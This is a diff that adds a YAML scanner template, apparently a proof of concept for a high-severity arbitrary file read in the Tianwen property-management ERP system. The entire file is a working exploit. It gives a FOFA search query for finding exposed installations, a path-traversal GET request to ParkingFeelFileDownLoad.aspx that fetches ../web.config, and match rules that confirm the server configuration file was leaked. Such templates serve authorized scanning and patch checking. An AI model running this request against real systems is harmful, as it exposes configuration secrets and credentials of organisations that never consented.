@@ -1,0 +1,22 @@
+id: poc-yaml-tianwen-wuye-erp-parkingfeelfiledownload-anyfile-read
+info:
+  name: 天问物业ERP系统 ParkingFeelFileDownLoad 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 天问物业ERP系统
+  fofa: body="天问物业ERP系统"
+requests:
+- method: GET
+  path: /HM/M_main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config
+  expression: 'status_code == 200 &&
+
+    contains(headers,"filename=web.config") &&
+
+    contains(content_type,"application/octet-stream") &&
+
+    contains(body,"<configuration>")
+
+    '
+variables: {}
+transport: http
